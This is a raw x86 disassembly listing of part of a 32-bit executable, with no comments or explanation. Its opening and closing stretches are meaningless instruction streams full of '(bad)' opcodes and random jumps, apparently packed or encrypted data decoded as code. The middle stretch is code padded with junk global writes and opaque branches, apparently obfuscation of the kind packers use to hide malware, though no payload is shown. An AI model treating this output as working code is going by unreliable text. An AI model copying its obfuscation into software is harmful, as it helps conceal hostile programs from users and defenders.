  41908f:	call   DWORD PTR [esi-0x3f8f3402]
  419095:	aas    
  419096:	or     BYTE PTR [edx+0x3f],ch
  419099:	ret    
  41909a:	push   ss
  41909b:	sbb    BYTE PTR [edx+edx*1-0x3620e7e8],bh
  4190a2:	retf   
  4190a3:	sub    bl,ch
  4190a5:	inc    ebp
  4190a6:	mov    al,0x90
  4190a8:	fisub  WORD PTR [edx-0x2d]
  4190ab:	and    BYTE PTR [ebx],bl
  4190ad:	xor    eax,0x1058bcce
  4190b2:	jae    0x41905e
  4190b4:	aam    0xf3
  4190b6:	pop    es
  4190b7:	aad    0x1f
  4190b9:	or     al,0x94
  4190bb:	repz (bad) 
  4190bd:	aad    0xda
  4190bf:	jne    0x4190f0
  4190c1:	gs fcomp st(1)
  4190c4:	inc    eax
  4190c5:	mov    dh,0xaa
  4190c7:	mov    eax,ds:0x5624c4c2
  4190cc:	stos   BYTE PTR es:[edi],al
  4190cd:	neg    BYTE PTR [eax]
  4190cf:	cdq    
  4190d0:	icebp  
  4190d1:	pop    ss
  4190d2:	sbb    DWORD PTR [ebx],ebx
  4190d4:	mov    al,ds:0x44c880eb
  4190d9:	das    
  4190da:	mov    ecx,DWORD PTR [eax]
  4190dc:	mov    ah,0xb
  4190de:	dec    ebx
  4190e0:	mov    BYTE PTR [ecx+esi*2+0x32],bh
  4190e4:	loope  0x4190c4
  4190e6:	dec    edi
  4190e7:	xor    BYTE PTR [ebx-0xfd6ad05],ch
  4190ed:	inc    ebp
  4190ee:	or     BYTE PTR [esi+0x43],cl
  4190f1:	xchg   ebp,eax
  4190f2:	dec    eax
  4190f3:	jb     0x4190b7
  4190f5:	pop    ss
  4190f6:	imul   eax,DWORD PTR [eax],0xfbb5f893
  4190fc:	stc    
  4190fd:	mov    ebp,0x95eff198
  419102:	push   ecx
  419103:	loop   0x41910b
  419105:	sti    
  419106:	xchg   esp,eax
  419107:	mov    cl,0x2d
  419109:	mov    bl,0x1a
  41910b:	pop    ecx
  41910c:	repz (bad) 
  41910f:	jg     0x4190e3
  419111:	ret    0xa346
  419114:	popa   
  419115:	mov    dl,0xc1
  419117:	pop    ecx
  419118:	and    eax,0x7043d710
  41911d:	and    BYTE PTR [ebp+0x33],bh
  419120:	sbb    BYTE PTR [eax],0xf9
  419123:	dec    ebp
  419124:	lods   al,BYTE PTR ds:[esi]
  419125:	add    ch,ch
  419127:	push   DWORD PTR [ebp-0xcc22ca0]
  41912d:	or     bl,BYTE PTR ds:0x9d7b3b3e
  419133:	loopne 0x4190e9
  419135:	jmp    0x419136
  419137:	stc    
  419138:	sub    eax,0x7df83fb6
  41913d:	out    0x26,eax
  41913f:	out    0xdf,al
  419141:	mov    cl,0x8a
  419143:	rcr    bl,1
  419145:	mov    fs,WORD PTR [edi+0x398d15c7]
  41914b:	add    dh,BYTE PTR [ebx+0x52]
  41914e:	int    0x96
  419150:	lahf   
  419151:	xchg   ebx,eax
  419152:	mov    al,ds:0x5c75c28f
  419157:	pop    esi
  419158:	jg     0x41915f
  41915a:	mov    dh,0x61
  41915c:	push   DWORD PTR [edx-0x4bd96856]
  419162:	inc    ebx
  419163:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419164:	das    
  419165:	xor    BYTE PTR [ecx-0x3e],ch
  419168:	scas   eax,DWORD PTR es:[edi]
  419169:	outs   dx,DWORD PTR ds:[esi]
  41916a:	jge    0x41910c
  41916c:	data16 es jno 0x4191dd
  419170:	cmp    ebx,ebp
  419172:	into   
  419173:	xchg   esp,eax
  419174:	pop    eax
  419175:	push   cs
  419176:	in     eax,0x3e
  419178:	dec    edi
  419179:	cmp    cl,BYTE PTR [edx]
  41917b:	mov    DWORD PTR [esi+0x1c],eax
  41917e:	or     BYTE PTR [edx-0x40],ah
  419181:	clc    
  419182:	icebp  
  419183:	cli    
  419184:	imul   ecx,DWORD PTR [edi],0xffffffb1
  419187:	xchg   edi,eax
  419188:	call   0x2fcc2fcc
  41918d:	cmp    al,BYTE PTR [edx-0x7277e93]
  419193:	push   eax
  419194:	(bad)  
  419195:	retf   0x6031
  419198:	data16 (bad) 
  41919a:	gs ja  0x419194
  41919d:	sub    DWORD PTR [ebp+0x4e8adf48],ebp
  4191a3:	int    0xd1
  4191a5:	jae    0x4191fd
  4191a7:	mov    ecx,0xae5f4ad6
  4191ac:	inc    ecx
  4191ad:	or     eax,0x1521ab8d
  4191b2:	jl     0x419186
  4191b4:	bound  edi,QWORD PTR [esi-0x2f1c0bfc]
  4191ba:	inc    ecx
  4191bb:	cmp    eax,0xedc9bf0c
  4191c0:	wbinvd 
  4191c2:	std    
  4191c3:	in     eax,0xe1
  4191c5:	ret    
  4191c6:	out    dx,eax
  4191c7:	and    BYTE PTR [ecx-0x6df862d1],al
  4191cd:	das    
  4191ce:	and    ebp,edx
  4191d0:	lea    esp,[ebx+0x35c10658]
  4191d6:	scas   al,BYTE PTR es:[edi]
  4191d7:	jge    0x4191f4
  4191d9:	idiv   DWORD PTR [esi]
  4191db:	dec    edx
  4191dc:	or     eax,0xfc03ba74
  4191e1:	add    ebp,DWORD PTR [edx]
  4191e3:	and    BYTE PTR [edx],cl
  4191e5:	cli    
  4191e6:	aam    0xe9
  4191e8:	jno    0x419267
  4191ea:	les    edx,FWORD PTR [edi+edi*8-0x59c0df3b]
  4191f1:	aas    
  4191f2:	stc    
  4191f3:	out    0xb8,al
  4191f5:	cmp    dl,ah
  4191f7:	cwde   
  4191f8:	in     eax,dx
  4191f9:	push   0x35
  4191fb:	or     ebp,esi
  4191fd:	es pop ebx
  4191ff:	add    edi,DWORD PTR [edi-0x10]
  419202:	leave  
  419203:	push   ss
  419204:	mov    edx,0xd6b8207
  419209:	scas   al,BYTE PTR es:[edi]
  41920a:	ret    0x597c
  41920d:	test   DWORD PTR [edx-0x41],esi
  419210:	mov    edi,0xa87c81f1
  419215:	out    0xce,eax
  419217:	aas    
  419218:	sahf   
  419219:	adc    DWORD PTR [ecx+0x3b654594],ebp
  41921f:	xor    dl,cl
  419221:	or     cl,BYTE PTR [ecx]
  419223:	inc    edi
  419224:	add    eax,0xd2836518
  419229:	cmp    ebx,DWORD PTR [ecx+0x5d]
  41922c:	loop   0x419257
  41922e:	adc    eax,DWORD PTR [bp+si-0x6a34]
  419233:	rcr    BYTE PTR [ebp+eiz*8-0x56ac9954],0xd2
  41923b:	or     bl,cl
  41923d:	(bad)  
  41923e:	fistp  DWORD PTR [edx]
  419240:	adc    ebx,DWORD PTR [eax+0x76aa021b]
  419246:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419247:	mov    dl,0x47
  419249:	shl    ah,1
  41924b:	dec    esp
  41924c:	push   esp
  41924d:	cmc    
  41924e:	cmp    BYTE PTR [ebp-0x76],dh
  419251:	inc    edx
  419252:	add    esi,ecx
  419254:	loope  0x419220
  419256:	(bad)  
  419257:	ret    
  419258:	cmp    DWORD PTR [edi-0x4a],esi
  41925b:	jo     0x419290
  41925d:	or     al,0xe2
  41925f:	(bad)  [ecx-0x68e7a13c]
  419265:	aas    
  419266:	pop    edi
  419267:	mov    ch,0x86
  419269:	or     al,0xe
  41926b:	mov    ebx,0xa442fdb2
  419270:	pop    ebp
  419271:	dec    eax
  419272:	push   ebp
  419273:	jne    0x419253
  419275:	ins    DWORD PTR es:[edi],dx
  419276:	inc    esi
  419277:	mov    bl,0xe7
  419279:	pop    esi
  41927a:	test   eax,0x3c1d5e74
  41927f:	aam    0x23
  419281:	dec    ecx
  419282:	cwde   
  419283:	adc    al,0x3f
  419285:	cs in  al,0x72
  419288:	push   cs
  419289:	lods   al,BYTE PTR ds:[esi]
  41928a:	inc    edi
  41928b:	js     0x419292
  41928d:	add    DWORD PTR [eax],0xffffffc3
  419290:	(bad)  
  419291:	jl     0x41930b
  419293:	mov    eax,0xe855502b
  419298:	std    
  419299:	push   esi
  41929a:	gs jnp 0x41925e
  41929d:	(bad)  
  41929e:	cmp    esi,edx
  4192a0:	sub    dh,dh
  4192a2:	push   eax
  4192a3:	adc    dl,BYTE PTR [ebp-0x1c5a2ef3]
  4192a9:	push   esi
  4192aa:	mov    dh,0x31
  4192ac:	test   BYTE PTR [edx+esi*8+0x6d],al
  4192b0:	fldcw  WORD PTR ds:0x55a8b8db
  4192b6:	adc    ch,cl
  4192b8:	jle    0x4192c1
  4192ba:	mov    esp,0x395c7bb2
  4192bf:	lock cmp dl,ch
  4192c2:	adc    dh,BYTE PTR [edx]
  4192c4:	jmp    0x2405:0xe57c9680
  4192cb:	test   BYTE PTR [esi-0x6c],ah
  4192ce:	adc    eax,DWORD PTR [esi+0x55499e20]
  4192d4:	or     eax,0xffffffe6
  4192d7:	pop    eax
  4192d8:	sub    edi,DWORD PTR [edx]
  4192da:	jb     0x4192d8
  4192dc:	jns    0x419313
  4192de:	ja     0x419307
  4192e0:	adc    DWORD PTR [edi+esi*2+0x5],edi
  4192e4:	inc    edx
  4192e5:	(bad)
  4192e8:	je     0x41931e
  4192ea:	mov    eax,gs:0xc2a96c29
  4192f0:	leave  
  4192f1:	jno    0x4192e8
  4192f3:	mov    dh,ch
  4192f5:	aas    
  4192f6:	sub    eax,0xe18a79cc
  4192fb:	and    BYTE PTR [eax+0x6b],dh
  4192fe:	cmp    al,0x5c
  419301:	cmp    dh,BYTE PTR [ebx+0x1a]
  419304:	daa    
  419305:	loopne 0x4192ec
  419307:	mov    ch,0xf1
  419309:	shl    ebx,1
  41930b:	cdq    
  41930c:	aam    0x20
  41930e:	fwait
  41930f:	dec    esi
  419310:	cmp    dh,BYTE PTR [esi-0xbbf4a75]
  419316:	aas    
  419317:	div    BYTE PTR [ebx-0x17]
  41931a:	fsubr  DWORD PTR [eax-0x6ed47daa]
  419320:	sbb    al,0x8b
  419322:	movntq (bad),mm3
  419323:	out    0xda,eax
  419325:	psubusb mm7,QWORD PTR [ebp+0xb]
  419329:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41932a:	xlat   BYTE PTR ds:[ebx]
  41932b:	sub    dh,BYTE PTR [esi]
  41932d:	mov    edi,0xe89ba4be
  419332:	pop    edi
  419333:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419334:	cld    
  419335:	das    
  419336:	ror    BYTE PTR [edi+ebx*8-0x5347bd80],1
  41933d:	gs (bad) 
  41933f:	xchg   ebx,eax
  419340:	pop    es
  419341:	mov    ds:0x35bbc8dc,al
  419346:	mov    ds:0x82e670f7,al
  41934b:	data16 fcom st(2)
  41934e:	(bad)  
  41934f:	push   ds
  419350:	scas   al,BYTE PTR es:[edi]
  419351:	mov    ebp,0xa955fb1d
  419356:	neg    esp
  419358:	sbb    eax,0x89e1daf3
  41935d:	rol    DWORD PTR ds:0xcc19b74a,cl
  419363:	stos   DWORD PTR es:[edi],eax
  419364:	imul   ecx,DWORD PTR [edx-0x2ae1e298],0xffffffff
  41936b:	push   0xc853a3c8
  419370:	shl    DWORD PTR [edi-0x17],0x65
  419374:	fcomip st,st(4)
  419376:	sub    al,0xfd
  419378:	imul   eax,DWORD PTR [ebx+edx*2-0x76],0xf0eeefc5
  419380:	xchg   DWORD PTR [esi-0x13b8aa3f],edx
  419386:	retf   0x361
  419389:	bound  esi,QWORD PTR [ecx+0x14]
  41938c:	pop    ecx
  41938d:	daa    
  41938e:	and    DWORD PTR [ecx+eax*2-0x3f],ecx
  419392:	add    eax,DWORD PTR [esi]
  419394:	out    dx,al
  419395:	xchg   ebp,eax
  419396:	retf   
  419397:	mov    bl,0x97
  419399:	adc    dh,BYTE PTR [ecx]
  41939b:	dec    edx
  41939c:	mov    dh,0x39
  41939e:	pop    ss
  41939f:	and    al,0x85
  4193a1:	loopne 0x419367
  4193a3:	mov    ds:0x25662b2e,eax
  4193a8:	int    0x18
  4193aa:	adc    eax,0xfc580842
  4193af:	jge    0x41940d
  4193b1:	rcl    DWORD PTR [eax],1
  4193b3:	mov    bh,0x9b
  4193b5:	adc    al,0x1a
  4193b7:	bound  edx,QWORD PTR [esi+0x35]
  4193ba:	das    
  4193bb:	dec    esi
  4193bc:	cmp    esi,DWORD PTR [ebx-0x6533fcda]
  4193c2:	add    ah,ah
  4193c4:	sub    ah,ch
  4193c6:	mov    esi,0x718217b6
  4193cb:	out    dx,eax
  4193cc:	sub    ch,0x46
  4193cf:	fistp  QWORD PTR [ebx]
  4193d1:	pop    ecx
  4193d2:	ror    DWORD PTR [ebp+0x26793b4a],0xf5
  4193d9:	loopne 0x419436
  4193db:	cmp    al,0x58
  4193dd:	inc    ecx
  4193de:	into   
  4193df:	jle    0x419447
  4193e1:	inc    ebx
  4193e2:	inc    edi
  4193e3:	sub    DWORD PTR [edi],esi
  4193e5:	xor    eax,0x4690c968
  4193ea:	pop    esi
  4193eb:	ficom  DWORD PTR [eax+0x4b0b42d5]
  4193f1:	in     al,0x1a
  4193f3:	add    eax,0x6a72522d
  4193f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193f9:	mov    al,ds:0xe70b6885
  4193fe:	push   ss
  4193ff:	push   edx
  419400:	fmul   DWORD PTR [edi+ebx*2]
  419403:	sub    BYTE PTR [esi-0x20],0xb9
  419407:	sub    eax,0x1396e2d1
  41940c:	inc    ecx
  41940d:	mov    bh,0x55
  41940f:	unpcklps xmm5,XMMWORD PTR [ecx+edi*8-0x44]
  419414:	dec    esp
  419415:	fdiv   DWORD PTR [esi+0x6fb8c4b]
  41941b:	pop    ebx
  41941c:	jmp    0x419468
  41941e:	jae    0x4193e6
  419420:	add    BYTE PTR [eax-0x10ec9776],ah
  419426:	push   eax
  419427:	lahf   
  419428:	dec    esi
  419429:	mov    ecx,edi
  41942b:	mov    eax,0xc19970e
  419430:	mov    ds:0xf7d4131c,al
  419435:	sbb    BYTE PTR [eax],ah
  419437:	mov    ebp,0xbaaf40d1
  41943c:	adc    al,0x8c
  41943e:	ins    DWORD PTR es:[edi],dx
  41943f:	mov    bh,0xcd
  419441:	add    BYTE PTR [esi+0x31699acf],al
  419447:	loop   0x419467
  419449:	mov    esi,0xc25c5b6f
  41944e:	dec    edx
  41944f:	add    BYTE PTR [ecx],ah
  419451:	cmp    al,0x8b
  419453:	mov    WORD PTR [esp+eax*4],fs
  419456:	add    BYTE PTR [eax],al
  419458:	add    BYTE PTR [edi],cl
  41945a:	lods   al,BYTE PTR ds:[esi]
  41945b:	enter  0x8302,0x3d
  41945f:	pop    ds
  419460:	add    BYTE PTR [edx+0x0],0x0
  419464:	mov    DWORD PTR ds:0x428377,ebx
  41946a:	not    edx
  41946c:	not    edx
  41946e:	jmp    0x419554
  419473:	mov    edx,0x1545
  419478:	mov    DWORD PTR ds:0x428383,0x3a28
  419482:	cmp    DWORD PTR ds:0x42821f,0x0
  419489:	jae    0x4194bc
  41948f:	push   0x7047
  419494:	call   DWORD PTR ds:0x428de0
  41949a:	mov    DWORD PTR ds:0x42825b,0x5c93
  4194a4:	mov    edx,DWORD PTR ds:0x4282c3
  4194aa:	mov    edx,DWORD PTR [edx]
  4194ac:	sbb    DWORD PTR ds:0x4282fb,edx
  4194b2:	mov    DWORD PTR ds:0x428283,0x52b1
  4194bc:	or     DWORD PTR ds:0x42815b,edx
  4194c2:	and    DWORD PTR ds:0x42835f,ecx
  4194c8:	cmp    DWORD PTR ds:0x428307,0x0
  4194cf:	mov    DWORD PTR ds:0x428307,0x47af
  4194d9:	mov    edx,0x1450
  4194de:	mov    edx,0x7667
  4194e3:	mov    DWORD PTR ds:0x428283,0x72a1
  4194ed:	jmp    0x419554
  4194f2:	mov    DWORD PTR ds:0x428383,0x1b74
  4194fc:	mov    DWORD PTR ds:0x42815f,0x3203
  419506:	cmp    DWORD PTR ds:0x428307,0x0
  41950d:	jge    0x41953e
  419513:	push   0x42809b
  419518:	push   0x42807f
  41951d:	push   0x400000
  419522:	call   DWORD PTR ds:0x428e74
  419528:	adc    DWORD PTR ds:0x428167,0x266f
  419532:	xor    DWORD PTR ds:0x42835f,ebx
  419538:	xor    DWORD PTR ds:0x4282e7,ecx
  41953e:	mov    DWORD PTR ds:0x428157,0x7c57
  419548:	adc    edx,DWORD PTR ds:0x428233
  41954e:	dec    DWORD PTR ds:0x4282e7
  419554:	shr    ecx,0x2
  419557:	mov    ecx,DWORD PTR [esp+0x80]
  41955e:	xor    DWORD PTR ds:0x4282d7,0x502d
  419568:	mov    edx,DWORD PTR [esp+0x84]
  41956f:	xor    eax,0x329e695d
  419574:	xor    DWORD PTR ds:0x42836b,0x428387
  41957e:	xor    edx,edx
  419580:	or     edx,eax
  419582:	cmp    DWORD PTR ds:0x42816f,0x0
  419589:	mov    DWORD PTR ds:0x42815f,0x514f
  419593:	mov    DWORD PTR ds:0x428163,0x65eb
  41959d:	mov    DWORD PTR ds:0x428213,0x8ef
  4195a7:	jmp    0x4195fe
  4195ac:	mov    DWORD PTR ds:0x428273,0x70f3
  4195b6:	mov    eax,0x339d
  4195bb:	cmp    DWORD PTR ds:0x42816f,0x0
  4195c2:	jne    0x4195e8
  4195c8:	push   0x42802d
  4195cd:	push   0x428049
  4195d2:	call   DWORD PTR ds:0x428e78
  4195d8:	adc    DWORD PTR ds:0x428287,ecx
  4195de:	and    DWORD PTR ds:0x42827b,0x4c04
  4195e8:	add    DWORD PTR ds:0x428153,ebx
  4195ee:	and    DWORD PTR ds:0x42825f,0x6136
  4195f8:	add    DWORD PTR ds:0x428167,ebx
  4195fe:	mov    eax,ds:0x422538
  419603:	and    DWORD PTR ds:0x4282ef,0x428257
  41960d:	push   edx
  41960e:	push   DWORD PTR [eax+0x19c]
  419614:	lea    eax,[esp+0x80]
  41961b:	sub    DWORD PTR ds:0x42814b,0x231c
  419625:	push   eax
  419626:	sub    DWORD PTR ds:0x428173,0x428147
  419630:	shl    ecx,0x1e
  419633:	and    DWORD PTR ds:0x428257,0x7ddf
  41963d:	call   0x415231
  419642:	lea    eax,[ebp+0x10]
  419645:	or     DWORD PTR ds:0x428287,0x7c72
  41964f:	push   eax
  419650:	mov    DWORD PTR [esp+0x14],edi
  419654:	mov    DWORD PTR [esp+0x18],esi
  419658:	lea    eax,[ebp+0xc]
  41965b:	push   eax
  41965c:	neg    DWORD PTR ds:0x42825f
  419662:	mov    DWORD PTR [esp+0x18],edi
  419666:	lea    eax,[ebp+0x8]
  419669:	add    DWORD PTR ds:0x428273,0x7c30
  419673:	mov    DWORD PTR [esp+0x1c],esi
  419677:	mov    DWORD PTR [esp+0x18],edi
  41967b:	adc    DWORD PTR ds:0x428163,0x428133
  419685:	mov    DWORD PTR [esp+0x1c],esi
  419689:	sbb    DWORD PTR ds:0x428267,0x42822f
  419693:	push   eax
  419694:	neg    DWORD PTR ds:0x42814b
  41969a:	call   0x40cc09
  41969f:	push   0x4
  4196a1:	and    DWORD PTR ds:0x42814b,0x4282d7
  4196ab:	push   0x4223bc
  4196b0:	sbb    DWORD PTR ds:0x428263,0x30c9
  4196ba:	push   DWORD PTR [esp+0x14]
  4196be:	sbb    DWORD PTR ds:0x42820b,0x560d
  4196c8:	call   0x415231
  4196cd:	sub    ecx,ebx
  4196cf:	mov    eax,DWORD PTR [esp+0xc]
  4196d3:	movzx  ebx,BYTE PTR ds:0x42821f
  4196da:	sbb    DWORD PTR ds:0x428303,ebx
  4196e0:	mov    ecx,DWORD PTR [esp+0xc]
  4196e4:	adc    DWORD PTR ds:0x428233,0x79e1
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	mov    ecx,DWORD PTR [ecx]
  4196f2:	shr    eax,0x1e
  4196f5:	add    DWORD PTR ds:0x42824f,ecx
  4196fb:	shl    ecx,0x2
  4196fe:	and    ebx,edx
  419700:	or     eax,ecx
  419702:	adc    DWORD PTR ds:0x42821b,ebx
  419708:	mov    ecx,DWORD PTR [esp+0xc]
  41970c:	cmp    DWORD PTR ds:0x428353,0x0
  419713:	mov    edx,DWORD PTR ds:0x4282cf
  419719:	mov    edx,0x8ae
  41971e:	mov    DWORD PTR ds:0x42824b,0x3b2
  419728:	jmp    0x419775
  41972d:	mov    DWORD PTR ds:0x428363,0x5836
  419737:	cmp    DWORD PTR ds:0x428353,0x0
  41973e:	jbe    0x419767
  419744:	push   DWORD PTR [ebp-0x24]
  419747:	call   DWORD PTR ds:0x428de4
  41974d:	movzx  edx,BYTE PTR ds:0x42814b
  419754:	adc    DWORD PTR ds:0x4282d3,edx
  41975a:	movzx  edx,BYTE PTR ds:0x428287
  419761:	add    DWORD PTR ds:0x42816b,edx
  419767:	and    edx,edx
  419769:	sub    ebx,edx
  41976b:	or     DWORD PTR ds:0x42827f,0x6a01
  419775:	xor    eax,0xa4069aae
  41977a:	cmp    DWORD PTR ds:0x42816b,0x0
  419781:	mov    DWORD PTR ds:0x428233,ebx
  419787:	mov    ebx,0x3314
  41978c:	jmp    0x4197fe
  419791:	mov    DWORD PTR ds:0x42824b,ebx
  419797:	cmp    DWORD PTR ds:0x42816b,0x0
  41979e:	jb     0x4197dd
  4197a4:	push   0x7db2
  4197a9:	push   0x7dda
  4197ae:	push   0x6d09
  4197b3:	push   DWORD PTR [ebp-0x20]
  4197b6:	push   DWORD PTR [ebp-0x28]
  4197b9:	call   DWORD PTR ds:0x428de8
  4197bf:	sub    DWORD PTR ds:0x428263,0x63b8
  4197c9:	add    DWORD PTR ds:0x4282df,0x42821f
  4197d3:	add    DWORD PTR ds:0x42823f,0x428167
  4197dd:	mov    ebx,DWORD PTR ds:0x428187
  4197e3:	xor    edx,edx
  4197e5:	add    edx,DWORD PTR ds:0x428297
  4197eb:	sub    ebx,edx
  4197ed:	sub    ebx,DWORD PTR [ebx+edx*1]
  4197f0:	sbb    ebx,ebx
  4197f2:	add    DWORD PTR ds:0x428217,ecx
  4197f8:	and    DWORD PTR ds:0x42826f,ecx
  4197fe:	mov    DWORD PTR [ecx],eax
  419800:	lea    eax,[esp+0x40]
  419804:	neg    edx
  419806:	mov    DWORD PTR [esp+0x98],eax
  41980d:	add    ecx,DWORD PTR ds:0x4282ef
  419813:	lea    eax,[esp+0x98]
  41981a:	or     edx,0x537a
  419820:	mov    DWORD PTR [esp+0x9c],eax
  419827:	cmp    DWORD PTR ds:0x42816b,0x0
  41982e:	not    ebx
  419830:	mov    DWORD PTR ds:0x428357,0x7e9e
  41983a:	mov    edx,0x7e32
  41983f:	jmp    0x419909
  419844:	mov    DWORD PTR ds:0x4282f7,0x6cf
  41984e:	mov    DWORD PTR ds:0x428383,0x6551
  419858:	cmp    DWORD PTR ds:0x42816b,0x0
  41985f:	jge    0x41988b
  419865:	push   0x4cee
  41986a:	push   0x2107
  41986f:	push   0x820f
  419874:	push   DWORD PTR [ebp-0x10]
  419877:	call   DWORD PTR ds:0x428e7c
  41987d:	adc    edx,edx
  41987f:	add    ecx,0x4be2
  419885:	and    ecx,0x5fef
  41988b:	mov    ebx,DWORD PTR ds:0x42838b
  419891:	mov    ecx,DWORD PTR ds:0x42838f
  419897:	sub    ebx,ecx
  419899:	or     ebx,DWORD PTR [ebx+ecx*1]
  41989c:	xor    ecx,DWORD PTR ds:0x42827b
  4198a2:	cmp    DWORD PTR ds:0x42813f,0x0
  4198a9:	mov    DWORD PTR ds:0x428133,0x2b9c
  4198b3:	movzx  ecx,WORD PTR ds:0x4282ff
  4198ba:	not    DWORD PTR ds:0x4282f3
  4198c0:	jmp    0x419909
  4198c5:	mov    edx,0x5053
  4198ca:	cmp    DWORD PTR ds:0x42813f,0x0
  4198d1:	jne    0x4198eb
  4198d7:	call   DWORD PTR ds:0x428dec
  4198dd:	sbb    ecx,ecx
  4198df:	not    DWORD PTR ds:0x428263
  4198e5:	and    DWORD PTR ds:0x4282fb,edi
  4198eb:	mov    edx,DWORD PTR ds:0x4282cf
  4198f1:	sbb    DWORD PTR ds:0x428157,edx
  4198f7:	or     DWORD PTR ds:0x4282e7,0x212d
  419901:	adc    edx,edx
  419903:	and    DWORD PTR ds:0x428253,edi
  419909:	mov    eax,DWORD PTR [esp+0x40]
  41990d:	sub    DWORD PTR [esp+0x40],eax
  419911:	mov    edx,DWORD PTR ds:0x4281ff
  419917:	xor    ecx,ecx
  419919:	xor    ecx,DWORD PTR ds:0x428203
  41991f:	sub    edx,ecx
  419921:	or     edx,DWORD PTR [edx+ecx*1]
  419924:	lea    eax,[ebp+0x4]
  419927:	cmp    DWORD PTR ds:0x4282f7,0x0
  41992e:	mov    edx,0x60f5
  419933:	not    edx
  419935:	not    edx
  419937:	jmp    0x419a27
  41993c:	mov    DWORD PTR ds:0x42820b,0x4551
  419946:	mov    DWORD PTR ds:0x42826f,0x487
  419950:	cmp    DWORD PTR ds:0x4282f7,0x0
  419957:	jne    0x419988
  41995d:	push   0x803a
  419962:	push   DWORD PTR [ebp-0x18]
  419965:	push   DWORD PTR [ebp-0x1c]
  419968:	push   0x318a
  41996d:	push   DWORD PTR [ebp-0x20]
  419970:	call   DWORD PTR ds:0x428df0
  419976:	sbb    edx,ebx
  419978:	add    ecx,0x5f27
  41997e:	sbb    DWORD PTR ds:0x4282cf,0x75a
  419988:	sub    DWORD PTR ds:0x428277,0x2f43
  419992:	movzx  ecx,BYTE PTR ds:0x42821b
  419999:	sub    ecx,DWORD PTR ds:0x42837f
  41999f:	mov    DWORD PTR ds:0x42821b,ecx
  4199a5:	cmp    DWORD PTR ds:0x42823b,0x0
  4199ac:	mov    DWORD PTR ds:0x4282d3,0x47a6
  4199b6:	mov    edx,0x1bf3
  4199bb:	mov    DWORD PTR ds:0x42813b,0x10c7
  4199c5:	mov    DWORD PTR ds:0x428357,0x1d16
  4199cf:	jmp    0x419a27
  4199d4:	mov    DWORD PTR ds:0x42823b,edi
  4199da:	cmp    DWORD PTR ds:0x42823b,0x0
  4199e1:	jge    0x419a0f
  4199e7:	push   0x428213
  4199ec:	push   0x427f3b
  4199f1:	call   DWORD PTR ds:0x428e80
  4199f7:	sub    DWORD PTR ds:0x428387,ecx
  4199fd:	mov    ecx,DWORD PTR ds:0x4282ff
  419a03:	sbb    DWORD PTR ds:0x428287,ecx
  419a09:	adc    edx,DWORD PTR ds:0x42836b
  419a0f:	and    edx,0x987
  419a15:	adc    DWORD PTR ds:0x4282e7,0x29fb
  419a1f:	sbb    ecx,edx
  419a21:	xor    DWORD PTR ds:0x4282df,edi
  419a27:	xor    DWORD PTR [esp+0x40],eax
  419a2b:	mov    ebx,DWORD PTR ds:0x4282f7
  419a31:	xor    DWORD PTR ds:0x42820b,ebx
  419a37:	mov    DWORD PTR [esp+0x30],0x5b3d
  419a3f:	add    edx,0x5f01
  419a45:	mov    DWORD PTR [esp+0x34],0x4445
  419a4d:	sub    eax,DWORD PTR ds:0x42820f
  419a53:	mov    DWORD PTR [esp+0x10],0xa52
  419a5b:	mov    DWORD PTR [esp+0x14],0x1c69
  419a63:	mov    eax,DWORD PTR [esp+0x10]
  419a67:	jmp    0x419e36
  419a6c:	xchg   DWORD PTR [edi-0x63e03bea],ebp
  419a72:	inc    edx
  419a73:	sub    bh,BYTE PTR [edx-0x28f7006]
  419a79:	pushf  
  419a7a:	aas    
  419a7b:	mov    esi,0x1816bbe3
  419a80:	mov    esp,0xf1181812
  419a85:	push   ecx
  419a86:	mov    eax,0xf271bff6
  419a8b:	dec    edx
  419a8c:	mov    bl,0x84
  419a8e:	jne    0x419a45
  419a90:	stos   DWORD PTR es:[edi],eax
  419a91:	daa    
  419a92:	fs add eax,0x9eb5249
  419a98:	dec    ebp
  419a99:	add    eax,0xcbfd515f
  419a9e:	(bad)  
  419a9f:	(bad)  
  419aa0:	push   ebx
  419aa1:	push   ebp
  419aa2:	call   0x82a6:0xc99f082f
  419aa9:	push   0xffffffa2
  419aab:	xchg   ebx,eax
  419aac:	pop    ss
  419aad:	mov    ds:0xed7f6161,al
  419ab2:	outs   dx,BYTE PTR ds:[esi]
  419ab3:	call   0x877d:0xff49ce5b
  419aba:	and    eax,esi
  419abc:	xor    eax,0x32abce8a
  419ac1:	ret    0x197c
  419ac4:	dec    ecx
  419ac5:	xor    dl,bl
  419ac7:	call   0x12ee1f47
  419acc:	jns    0x419a51
  419ace:	idiv   BYTE PTR [edi]
  419ad0:	in     al,0x51
  419ad2:	sbb    DWORD PTR fs:[esi],ecx
  419ad5:	push   esi
  419ad6:	mov    eax,0x23e7f527
  419adb:	mov    al,0x90
  419add:	mov    edi,0x93cc6c
  419ae2:	lea    edx,[esi-0x75]
  419ae5:	jmp    DWORD PTR [edx+edx*1-0x65]
  419ae9:	mov    bl,BYTE PTR [ebp+0x65]
  419aec:	test   edi,ecx
  419aee:	push   edx
  419aef:	dec    eax
  419af0:	sti    
  419af1:	in     eax,0xc9
  419af3:	out    0x61,eax
  419af5:	cwde   
  419af6:	mov    esp,0x721219ca
  419afb:	addr16 popf 
  419afd:	add    ebx,DWORD PTR [ebp+0x3d]
  419b00:	popf   
  419b01:	sbb    eax,0xb9aabb88
  419b06:	mov    eax,ds:0x3eeb48ad
  419b0b:	push   ss
  419b0c:	arpl   WORD PTR ds:0x4e893f4a,sp
  419b12:	test   al,0xc3
  419b14:	add    DWORD PTR [ecx],ebp
  419b16:	iret   
  419b17:	call   0x57c3eeb3
  419b1c:	push   esi
  419b1d:	cmp    BYTE PTR ds:0xcc7407b4,cl
  419b23:	add    dl,BYTE PTR [ebx-0x2f39b086]
  419b29:	fcmovne st,st(5)
  419b2b:	push   esp
  419b2c:	bound  eax,QWORD PTR ss:[edi-0xe]
  419b30:	sub    al,0xe1
  419b32:	xchg   DWORD PTR [ebx],esp
  419b34:	jmp    0x158c691b
  419b39:	or     DWORD PTR [edi],eax
  419b3b:	inc    ecx
  419b3c:	icebp  
  419b3d:	pushf  
  419b3e:	jmp    0x923bc020
  419b43:	push   edx
  419b44:	push   ecx
  419b45:	aas    
  419b46:	push   ebx
